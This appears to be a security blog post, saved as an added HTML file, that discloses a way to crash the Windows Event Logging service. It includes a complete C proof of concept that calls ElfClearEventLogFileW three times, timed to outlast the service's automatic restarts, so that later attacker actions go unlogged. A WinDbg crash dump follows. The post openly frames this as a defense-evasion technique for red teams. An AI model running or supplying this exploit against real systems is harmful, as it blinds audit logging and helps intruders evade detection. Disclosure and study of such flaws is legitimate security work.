@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Benjamin Lim">
+  <meta name="description" content="While trying to write an undetectable event log cleaner, I delved into the NTAPIs to try to prevent Event ID 1102 from being created. In the process,...">
+
+  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.2.3/css/bootstrap.min.css" type="text/css" media="all">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.5.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="../theme/css/style.css" type="text/css" media="all">
+  <link rel="stylesheet" href="../theme/css/pygments.css" type="text/css" media="all">
+  
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.2.3/js/bootstrap.min.js"></script>
+
+  <link rel="stylesheet" href="../theme/css/cookies-eu-banner.default.css" type="text/css" media="all">
+  <script src="../theme/js/cookies-eu-banner.js"></script>
+
+  
+ 
+
+  <link href="https://limbenjamin.com/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="limbenjamin Full Atom Feed" />
+
+<meta name="keywords" content="limbenjamin, Security">
+
+<meta property="og:title" content="Crash Windows Event Logging Service">
+<meta property="og:type" content="website">
+<meta property="og:image" content="http://limbenjamin.com/media/chip.png"/>
+<meta property="og:image:secure_url" content="https://limbenjamin.com/media/chip.png"/>
+<meta property="og:site_name" content="https://limbenjamin.com">
+<meta property="og:description" content="While trying to write an undetectable event log cleaner, I delved into the NTAPIs to try to prevent Event ID 1102 from being created. In the process, I stumbled upon a way to crash the Windows Event Logging service. This is interesting because crashing the logging service would mean that …">
+<meta property="og:url" content="https://limbenjamin.com/articles/crash-windows-event-logging-service.html">
+<meta property="fb:admins" content="557193263"/>
+<meta property="fb:app_id" content="520142688161055"/>
+
+
+  <title>Crash Windows Event Logging Service</title>
+  
+</head>
+
+<body class="home blog">
+    <div id="cookies-eu-banner" style="display: none;position:fixed;bottom: 0">
+        We use Google Analytics to analyze our traffic. By clicking "Accept", you consent to our use of cookies.
+        <a href="../pages/privacy-policy-disclaimer.html" id="cookies-eu-more">Read more</a>
+        <button id="cookies-eu-reject">Reject</button>
+        <button id="cookies-eu-accept">Accept</button>
+    </div>
+
+  <div>
+    <header class="site-header">
+      <nav class="navbar navbar-expand-lg navbar-light">
+        <div class="container">
+          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+          </button>
+          <div class="collapse navbar-collapse navbar-default" id="navbarSupportedContent">
+            <ul class="navbar-nav me-auto mb-2 mb-lg-0">
+              <li class="nav-item"><a class="nav-link" href="/index.html" >Index
+<i class="fa  fa-lg"></i></a></li>
+              <li class="nav-item"><a class="nav-link" href="/pages/about-me.html" >About me
+<i class="fa  fa-lg"></i></a></li>
+              <li class="nav-item"><a class="nav-link" href="/files/cv.html" >Résumé
+<i class="fa  fa-lg"></i></a></li>
+              <li class="nav-item"><a class="nav-link" href="/pages/projects.html" >Projects
+<i class="fa  fa-lg"></i></a></li>
+              <li class="nav-item"><a class="nav-link" href="/pages/reading-list.html" >Reading List
+<i class="fa  fa-lg"></i></a></li>
+            </ul>
+            <div class="d-flex">
+                <a class="nav-link" href="https://limbenjamin.com/feeds/all.atom.xml" title="Feed" >
+<i class="fa fa-rss fa-lg"></i></a><div style="padding-right: 1em;"></div>
+                <a class="nav-link" href="#mail" title="Email" >
+<i class="fa fa-envelope fa-lg"></i></a><div style="padding-right: 1em;"></div>
+                <a class="nav-link" href="https://sg.linkedin.com/in/1imbenjamin" title="LinkedIn" >
+<i class="fa fa-linkedin fa-lg"></i></a><div style="padding-right: 1em;"></div>
+                <a class="nav-link" href="https://github.com/limbenjamin" title="GitHub" >
+<i class="fa fa-github fa-lg"></i></a><div style="padding-right: 1em;"></div>
+               <div class="oval">
+                <center>
+                  <img src="/files/nricspecimengen/merlion.png" class="merlion" style="height: 30px;"/>
+                </center>
+               </div> 
+            </div>
+          </div>
+        </div>
+      </nav>
+
+    <div class="container">
+      <div id="logo">
+        <span class="site-name"><a class="navbar-brand" href=".."><svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"   width="233.45px" height="184.71px" viewBox="0 0 233.45 184.71" enable-background="new 0 0 233.45 184.71" xml:space="preserve"><ellipse id="c1" fill="none" cx="60.2" cy="57.5" rx="3.6" ry="3.1"/><ellipse id="c2" fill="none" cx="56.4" cy="103.3" rx="3.3" ry="3.2"/><ellipse id="c3" fill="none" cx="99.8" cy="121.7" rx="3.3" ry="3.1"/><ellipse id="c4" fill="none" cx="151.8" cy="124.9" rx="3.3" ry="2.8"/><ellipse id="c5" fill="none" cx="172.5" cy="87" rx="3.8" ry="2.9"/><ellipse id="c6" fill="none" cx="176.8" cy="41.1" rx="3.5" ry="3.1"/><ellipse id="c7" fill="none" cx="132.8" cy="23.3" rx="3.4" ry="3.2"/><ellipse id="c8" fill="none" cx="81.3" cy="19.8" rx="3.7" ry="3.4"/><path id="path4" fill="#FFF" stroke="#C4E6FC" stroke-width="12" stroke-miterlimit="10" d="M86 58l10-8s10-3 11-1c1 1-7 7-7 7L88 67v4c1 1 2 3 3 2l21-18 10-5h7L89 85l1 4 2 4c3 0 42-38 46-41h4l2 4-1 3-38 33-2 3 5 2 5-1c8-6 20-25 30-25l1 2 1 1-1 4s-19 12-17 18l5 1 4-2 6-4 5-4"/>    <path id="path3" fill="none" stroke="#0e94ec" stroke-width="9" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M114 85l-7 1-2-8h-2l11-1-12-10 13 2-7-6 8 1-7-5h3l5 2 6-2 2 5 5 3-9 3 7 1-8 4 9 2 1 3h-6l-4 1v4l3 2 4-3"/><path class="path2" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M64 139v15c0 5 3 8 7 8 5 1 9-2 10-6s-1-7-7-9l-7 2M154 163c-1-4 1-8-1-13-2-2-6-3-10-3-4 1-7 7-5 10 2 5 8 7 12 5l3-3"/><path class="path" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M116 15c2 10 0 19 1 29M117 101c-1 9 1 19-1 29M183 72h-34M84 72H52"/><path class="path2" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M131 147v17c1 4-2 6-6 5M101 160c-6 3-9 3-14-2v-7c2-3 6-5 10-4s6 4 7 7l-16 1M15 140v23"/><path class="path" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M84 87c-6-1-11 0-14 5l-11 8c1 3 1 6-3 7-3-2-3-2-3-6h6M133 101v7l16 14M174 44c4 1 4 1 7-2l-3-4c-5 0-6 1-4 6l-12 10c-4 4-8 5-13 4M85 23l8 7c6 4 7 9 7 14M85 49c-1 10 0 19 1 29v15c0 4 3 6 8 6l22 1 25-1"/><path class="path2" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M110 163v-7c0-6 0-7 7-9 6 0 8 4 7 8v8"/><path class="path" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M84 23c0-2 2-4 0-6-3-1-5-1-7 2 1 4 3 5 7 4"/><path class="path2" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M175 150c2-2 5-4 9-3 4 2 5 5 5 8s1 5-1 8M43 150c3-2 5-4 9-3 5 2 5 5 5 8v8M204 150c2-2 5-3 8-3 9 3 5 10 6 16"/><path class="path" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M100 101v16M133 27c-2 0-3-1-4-3 0-2 1-4 5-4 2 0 2 2 3 4-4 2-4 6-4 10v10M64 58c0 2-1 3-3 3-3 0-4-2-5-3l4-4 1 1c4 4 9 3 13 3h10M90 47l4-1h46s4 0 7 5v13a425 425 0 01-1 34"/><path class="path2" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M196 147v16M22 147c0 5-1 10 1 16"/><path class="path" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M106 82c-3-1-4 1-4 3 1 3 3 5 7 5 3 1 5-1 7-2M131 73c5 4 6 7 2 10l-3 3c-1 4-5 5-9 4-4 0-5-3-5-6l1-18M121 62l6-1v-6c-4-1-7-1-10 2M128 61c8 3 9 6 4 12M173 84c5 2 5 3 0 6-3 0-3-2-5-3 0 0 2-3 4-3M116 60c2-4-1-6-5-5-4 0-7 1-6 6"/><path class="path2" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M43 163v-9c0-2 0-5-3-6s-6-1-9 1l-2 2c1 4-1 8 1 12M175 163v-9c0-2 0-5-4-6-3-1-6-1-8 1l-2 2v12M203 147v16"/><path class="path" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M108 101c0 3 1 6-1 9M125 34v10M84 65H73M84 80H73M109 34l-1 10M99 118c-3 1-3 3-2 5s3 2 5 1c2-2 2-5-2-6M106 61c-9 2-10 5-6 11M125 101v7M104 71c-8 4-8 8-2 13M150 122c-3 3-3 3 1 6 3 0 4-1 5-3-1-3-3-3-5-3M149 65h12M150 81h11M169 87h-19"/><path class="path2" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M22 144v-1M132 144v-1M196 144v-1"/></svg></a>
+        </span><!-- end of .site-name -->
+      </div><!-- end of #logo -->
+        <div class="tagline">
+                <a href="../tag/coding.html" >Coding (12)</a> &#124; 
+                <a href="../tag/data.html" >Data (25)</a> &#124; 
+                <a href="../tag/legal.html" >Legal (40)</a> &#124; 
+                <a href="../tag/nus.html" >NUS (3)</a> &#124; 
+                <a href="../tag/security.html" >Security (122)</a> &#124; 
+                <a href="../tag/server.html" >Server (30)</a> &#124; 
+                <a href="../tag/untagged.html" >Untagged (20)</a> &#124; 
+                <a href="../archives.html" >Archives (214)</a>
+        </div>
+    </div>
+
+  </header><!-- #masthead -->
+  </div>
+    <div id="content" class="site-content">
+      <div class="container main-content-area">
+        <div class="row">
+          <div class="main-content-inner col-sm-12 col-md-12">
+            <div id="primary" class="content-area">
+              <div id="main" class="site-main" role="main">
+                <div class="article-container">
+<article>
+  <div class="blog-item-wrap">
+    <div class="post-inner-content">
+      <header class="entry-header page-header">
+        <span class="cat-item"><time datetime="2020-03-22 17:33:00+08:00">Mar 22, 2020</time></span>
+        <h1 class="entry-title-single-page"><a href="../articles/crash-windows-event-logging-service.html">Crash Windows Event Logging Service</a></h1>
+      </header><!-- .entry-header -->
+      <div class="entry-content">
+        <p>While trying to write an undetectable event log cleaner, I delved into the NTAPIs to try to prevent Event ID 1102 from being created. In the process, I stumbled upon a way to crash the Windows Event Logging service. This is interesting because crashing the logging service would mean that further adversary actions will not be logged. Hence, this would come in useful for a red team exercise. I am aware of <a href="https://artofpwn.com/phant0m-killing-windows-event-log.html">Phant0m</a>, which kills threads belonging to Windows Event Logging service to achieve the same effect. It is an excellent technique and is probably stealthier than this, however it does use <code>OpenThread</code> and <code>TerminateThread</code> which might seem suspicious when executed on <code>svchost.exe</code>. Nevertheless, it doesn't hurt to have more than 1 method. Hence, I am publishing this write up.</p>
+<p>Windows Event Logging service will crash with an Access Violation when advapi32.dll!ElfClearEventLogFileW is called with a handle obtained from advapi32.dll!OpenEventLogA. By default, The service is restarted after the first and second failure only. Hence an adversary can crash the service 3 times after which he is able to execute further malicious commands without being logged. The fail count will be reset after 1 day by default.</p>
+<p>POC code has been uploaded to <a href="https://github.com/limbenjamin/LogServiceCrash">github</a>. MSRC's response is that this case does not meet the bar for servicing in a security update because this vulnerability requires administrator privileges to execute, meaning this exploit does not cross a security boundary. </p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&quot;stdafx.h&quot;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;windows.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;winbase.h&gt;</span>
+
+<span class="k">typedef</span><span class="w"> </span><span class="n">LONG</span><span class="w"> </span><span class="n">NTSTATUS</span><span class="p">;</span>
+<span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">VERSION_NO</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;1.0&quot;</span><span class="p">;</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">eventlog</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+
+<span class="w">    </span><span class="n">eventlog</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">OpenEventLogA</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Security&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">ElfClearEventLogFileW</span><span class="p">(</span><span class="n">eventlog</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+
+<span class="w">    </span><span class="n">Sleep</span><span class="p">(</span><span class="mi">65000</span><span class="p">);</span>
+
+<span class="w">    </span><span class="n">eventlog</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">OpenEventLogA</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Security&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">ElfClearEventLogFileW</span><span class="p">(</span><span class="n">eventlog</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+
+<span class="w">    </span><span class="n">Sleep</span><span class="p">(</span><span class="mi">125000</span><span class="p">);</span>
+
+<span class="w">    </span><span class="n">eventlog</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">OpenEventLogA</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Security&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">ElfClearEventLogFileW</span><span class="p">(</span><span class="n">eventlog</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></td></tr></table></div>
+
+<p>The exact crash is caused by an OOB memory read. I don't think it is exploitable beyond denial of service.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span>
+<span class="normal">39</span>
+<span class="normal">40</span>
+<span class="normal">41</span>
+<span class="normal">42</span>
+<span class="normal">43</span>
+<span class="normal">44</span>
+<span class="normal">45</span>
+<span class="normal">46</span>
+<span class="normal">47</span>
+<span class="normal">48</span>
+<span class="normal">49</span></pre></div></td><td class="code"><div><pre><span></span><code>System info:
+
+    OS_VERSION:  10.0.18362.1
+    BUILDLAB_STR:  19h1_release
+    OSPLATFORM_TYPE:  x64
+    OSNAME:  Windows 10
+
+Crash Details:
+
+    wevtsvc!PerformClearRequest+0x164:
+    00007ff9`144d0970 4d8b4908        mov     r9,qword ptr [r9+8] ds:00000000`00000008=????????????????
+
+    EXCEPTION_RECORD:  (.exr -1)
+    ExceptionAddress: 00007ff9144d0970 (wevtsvc!PerformClearRequest+0x0000000000000164)
+       ExceptionCode: c0000005 (Access violation)
+      ExceptionFlags: 00000000
+    NumberParameters: 2
+       Parameter[0]: 0000000000000000
+       Parameter[1]: 0000000000000008
+    Attempt to read from address 0000000000000008
+
+    PROCESS_NAME:  svchost.exe
+    READ_ADDRESS:  0000000000000008 
+    ERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.
+    EXCEPTION_CODE_STR:  c0000005
+    EXCEPTION_PARAMETER1:  0000000000000000
+    EXCEPTION_PARAMETER2:  0000000000000008
+    GROUP:  LocalServiceNetworkRestricted
+    FAULTING_SERVICE_NAME:  EventLog
+
+    STACK_TEXT:  
+    00000050`fd87ebc0 00007ff9`1446ef7c : 00000000`00000000 00000050`fd87ed00 000001ef`ae433960 00000000`00000000 : wevtsvc!PerformClearRequest+0x164
+    00000050`fd87ec70 00007ff9`144e461d : 00000000`00000000 00000000`00000000 000001ef`ae433960 00007ff9`1d01fc2c : wevtsvc!ElfPerformRequest+0x6534c
+    00000050`fd87ecc0 00007ff9`1bc26953 : 000001ef`af397c90 00000000`00000000 00000000`00000002 00007ff9`144eb8f0 : wevtsvc!ElfrClearELFW+0x26d
+    00000050`fd87edc0 00007ff9`1bc8a036 : 00007ff9`144eac00 00000000`00000000 000001ef`00000000 00007ff9`00000000 : rpcrt4!Invoke+0x73
+    00000050`fd87ee10 00007ff9`1bbe7a4c : 0067006f`006c0074 00007ff9`0000005d 000001ef`af3f4090 00007ff9`1d01fc2c : rpcrt4!Ndr64StubWorker+0xb56
+    00000050`fd87f4b0 00007ff9`1bc048c8 : 000001ef`00000001 00007ff9`1bbd816e 00000050`fd87f6a8 00000000`00000001 : rpcrt4!NdrServerCallAll+0x3c
+    00000050`fd87f500 00007ff9`1bbdc921 : 00000050`fd87f819 00007ff9`144eaea8 00000050`fd87f6f0 00000000`00000001 : rpcrt4!DispatchToStubInCNoAvrf+0x18
+    00000050`fd87f550 00007ff9`1bbdc1db : 000001ef`ae441b50 00000000`00000001 00000000`00000000 00007ff9`1bc9fca4 : rpcrt4!RPC_INTERFACE::DispatchToStubWorker+0x2d1
+    00000050`fd87f630 00007ff9`1bbca86f : 00000050`fd87f7d0 000001ef`af6ad8b0 00000000`00000000 00000000`00000000 : rpcrt4!RPC_INTERFACE::DispatchToStub+0xcb
+    00000050`fd87f690 00007ff9`1bbc9d1a : 00000000`000a147a 00000000`00000001 00000000`00000000 000001ef`af69e1c0 : rpcrt4!LRPC_SCALL::DispatchRequest+0x31f
+    00000050`fd87f770 00007ff9`1bbc9301 : 00000000`00000002 000001ef`00000000 000001ef`00000000 00000000`00000000 : rpcrt4!LRPC_SCALL::HandleRequest+0x7fa
+    00000050`fd87f870 00007ff9`1bbc8d6e : 00000000`00000000 00000000`00000000 00000000`00000001 000001ef`ae429d90 : rpcrt4!LRPC_ADDRESS::HandleRequest+0x341
+    00000050`fd87f910 00007ff9`1bbc69a5 : 00000000`00000001 000001ef`af1b87a0 000001ef`ae429e98 00000050`fd87fd58 : rpcrt4!LRPC_ADDRESS::ProcessIO+0x89e
+    00000050`fd87fa50 00007ff9`1d01346d : 00000000`00000000 00000000`00000000 000001ef`af1f7220 00000000`00000000 : rpcrt4!LrpcIoComplete+0xc5
+    00000050`fd87faf0 00007ff9`1d0141c2 : 000001ef`ae43ca50 00000000`00000000 000001ef`ae402340 00000000`00000000 : ntdll!TppAlpcpExecuteCallback+0x14d
+    00000050`fd87fb40 00007ff9`1c9c7bd4 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : ntdll!TppWorkerThread+0x462
+    00000050`fd87ff00 00007ff9`1d04ced1 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : kernel32!BaseThreadInitThunk+0x14
+    00000050`fd87ff30 00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : ntdll!RtlUserThreadStart+0x21
+</code></pre></div></td></tr></table></div>
+      </div><!-- .entry-content -->
+      <br /><br />
+      <div class="article_meta">
+        Tags:
+          <a href="../tag/security.html">Security</a>        <br />
+        <div class="similararticleline"></div>
+        <h2>Similar Articles</h2>
+          <div class="similararticlerow">
+              <blockquote class="similar_posts">
+              <a href="../articles/crash-windows-event-logging-service.html"><b>Crash Windows Event Logging Service - </b>
+              While trying to write an undetectable event log cleaner, I delved into the NTAPIs to try to prevent Event ID 1102 from being created. In the process, I stumbled upon a way to crash the Windows ...</a>
+              </blockquote>
+              <blockquote class="similar_posts">
+              <a href="../articles/windows-file-metadata.html"><b>windows file metadata - </b>
+              Windows seems to keep a very poor record of file attributes such as date created, date modified and date accessed. These attributes are important especially for audit purposes. My profs are even ...</a>
+              </blockquote>
+              <blockquote class="similar_posts">
+              <a href="../articles/windows-persistency-with-openvpn-gui.html"><b>Windows Persistency With OpenVPN GUI - </b>
+              OpenVPN GUI will automatically run the following batch files if it exists. No changes to config file is needed, just drop the batch file in place. Possible privilege escalation if user runs ...</a>
+              </blockquote>
+              <blockquote class="similar_posts">
+              <a href="../articles/yubikey-passwordless-windows-local-account-login.html"><b>Yubikey passwordless Windows local account login - </b>
+              Yubico used to publish a Windows Store application YubiKey for Windows Hello that allowed local non-domain joined accounts to login to Windows simply by inserting the YubiKey. However, that ...</a>
+              </blockquote>
+          </div>
+      </div>
+      <br />
+    </div>
+  </div>
+</article><!-- #post-## -->
+                </div>
+              </div><!-- #main -->
+          </div><!-- #primary -->
+        </div>
+      </div><!-- close .row -->
+    </div><!-- close .container -->
+  </div><!-- close .site-content -->
+
+  <div id="mail" class="overlay">
+    <div class="popup">
+      <a class="close" href="#">&times;</a>
+      <div id="popup_content">
+      </div>
+    </div>
+  </div>
+
+  <div id="footer-area">
+    <footer id="colophon" class="site-footer" role="contentinfo">
+      <div class="site-info container">
+        <div class="row">
+                    <div class="copyright col-md-12">
+                    <a href="../pages/privacy-policy-disclaimer.html">Privacy & Disclaimer</a> | 
+                    <a href="../feeds/all.atom.xml">Atom Feed</a> | 
+                    <a href="../sitemap.xml">Sitemap</a><br />
+                    This site uses the <a href="https://github.com/limbenjamin/voce">voce</a> theme by <a href="//limbenjamin.com/">Benjamin Lim</a><br />
+                    Page generated on Tue Jul 15 12:35:32 2025<br />
+                    &copy; 2012-2025 <a href="..">Benjamin Lim</a> </div>
+        </div>
+      </div><!-- .site-info -->
+      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+    </footer><!-- #colophon -->
+  </div>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function(){
+    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
+      window.scroll(0, document.getElementById('main').offsetTop);
+    }})
+  </script>
+
+
+  <script type="text/javascript" src="../theme/js/functions.min.js"></script>
+
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-028MBYWX6K"></script>
+<script>
+ new CookiesEuBanner(function () {
+	  window.dataLayer = window.dataLayer || [];
+	  function gtag(){dataLayer.push(arguments);}
+	  gtag('js', new Date());
+
+	  gtag('config', 'G-028MBYWX6K');
+  }, true);
+</script>
+  
+</body>
+</html>
